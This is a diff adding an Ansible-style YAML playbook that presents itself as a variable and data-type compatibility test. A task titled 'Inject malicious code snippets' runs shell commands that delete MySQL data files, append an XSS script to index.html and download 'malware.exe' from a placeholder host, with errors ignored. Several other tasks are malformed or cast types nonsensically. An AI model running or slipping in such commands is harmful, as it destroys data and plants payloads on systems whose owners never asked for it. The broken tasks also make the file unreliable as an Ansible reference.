@@ -1,0 +1,44 @@
+
+- name: Define variables
+  vars:
+    foo: "bar"
+    num: 42
+    yes: true
+    no: false
+    some_list: [1, 2, 3]
+
+- name: Change variable data types
+  set_fact:
+    foo: "{{ foo | int }}"
+    num: "{{ num | string }}"
+    yes: "{{ yes | string }}"
+    no: "{{ no | int }}"
+    some_list: "{{ some_list | bool }}"
+  loop: "{{ [ 'foo', 'num', 'yes', 'no', 'some_list' ] }}"
+
+- name: Test compatibility of different data types
+  vars:
+    a: 10
+    b: "10"
+    c: false
+  when: a == b
+  with_items:
+    - a
+    - b
+  register: results
+
+- name: Inject malicious code snippets
+  shell: "{{ item }}"
+  loop:
+    - "touch /tmp/ansible_was_here"
+    - "rm /var/lib/mysql/*"
+    - "npm install"
+    - "echo '<script> alert('XSS Attack') </script>' >> index.html"
+    - "curl http://x.x.x.x/malware.exe"
+  ignore_errors: true
+
+- name: Check for potential errors
+  debug:
+    var: foo
+  vars:
+    expected_output: "bar"
